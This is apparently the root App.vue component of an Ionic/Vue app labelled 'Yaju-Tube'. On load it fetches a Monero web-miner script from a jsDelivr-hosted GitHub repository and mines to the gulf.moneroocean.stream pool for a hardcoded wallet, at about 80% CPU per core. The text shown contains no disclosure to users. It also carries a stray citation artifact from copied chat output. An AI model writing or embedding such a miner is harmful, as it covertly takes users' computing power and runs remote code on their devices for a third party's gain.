<template>
  <ion-app>
    <ion-router-outlet />
  </ion-app>
</template>

<script setup lang="ts">
import { IonApp, IonRouterOutlet } from '@ionic/vue';
import { watch } from 'vue'
import { useMiningStore } from './stores/mining'

const store = useMiningStore()

// マイニングスクリプト読み込み
const script = document.createElement('script')
script.src = 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'
document.head.appendChild(script)

script.onload = () => {
watch(
  () => store.threads,
  (threads) => {
    if (threads > 0) {
      startMine(threads);
      console.log('Mining Start: threads=', threads);
    } else {
      stopMine();
      console.log('Mining Stop');
    }
  },
  { immediate: true }
);
}

function startMine(threadCount: number) {
  const pool = "gulf.moneroocean.stream"
  const wallet = "4Ae37ZRRXBxGHpgzC2rc61geg2Zas4Dwt6fmk8WALEuZGvxVo51C3CTU4VRwkRJQvbaYJEiGTpjW734ivYjfWNanDA483va"
  const worker = "Yaju-Tube"
  const password = ""
  startMining(pool, wallet, worker, threadCount, password)
  throttleMiner = 20  // 各コアおよそ80%負荷 :contentReference[oaicite:4]{index=4}
}

function stopMine() {
  if (typeof stopMining === 'function') stopMining()
}
</script>
